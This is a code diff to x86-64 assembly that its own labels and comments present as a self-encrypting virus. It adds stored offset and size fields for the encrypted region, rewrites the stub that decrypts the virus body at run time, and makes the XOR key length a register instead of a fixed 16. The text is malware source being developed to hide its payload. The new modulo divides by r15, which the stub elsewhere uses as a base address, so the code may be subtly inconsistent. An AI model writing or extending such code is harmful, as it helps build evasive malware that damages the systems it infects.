@@ -17,6 +17,12 @@ encryption_key:
 encrypted_flag:
     db 0
 
+; Encrypted region info (filled by encrypt program)
+encrypted_offset:
+    dq 0                        ; 8 bytes: file offset of encrypted region
+encrypted_size:
+    dq 0                        ; 8 bytes: size of encrypted region
+
 _start:
     ; Save all registers we'll use
     push rbp
@@ -43,10 +49,14 @@ _start:
     jz .not_encrypted           ; If 0, code is not encrypted
     
     ; Decrypt the virus code
-    ; Calculate start of decryption area (right after _start)
-    lea rdi, [r15 + decrypt_code.end - virus_start]
-    ; Calculate size to decrypt (from decrypt_end to virus_end)
-    mov rsi, virus_end - decrypt_code.end
+    ; Read encrypted offset (from virus_start) and size
+    mov rax, [r15 + encrypted_offset - virus_start]
+    mov rsi, [r15 + encrypted_size - virus_start]
+    
+    ; Calculate buffer address: virus_start + offset
+    add rax, r15                ; rax = r15 + offset = buffer address
+    mov rdi, rax
+    
     ; Get encryption key
     lea rdx, [r15 + encryption_key - virus_start]
     mov rcx, 16                 ; key size
@@ -155,9 +165,8 @@ decrypt_code:
     ; Get key index via modulo
     mov rax, rbx
     xor rdx, rdx
-    mov r9, 16
-    div r9
-    ; rdx = rbx % 16
+    div r15             ; Use r15 (keysize) instead of hardcoded 16
+    ; rdx = rbx % keysize
     
     ; XOR with key
     xor r9, r9
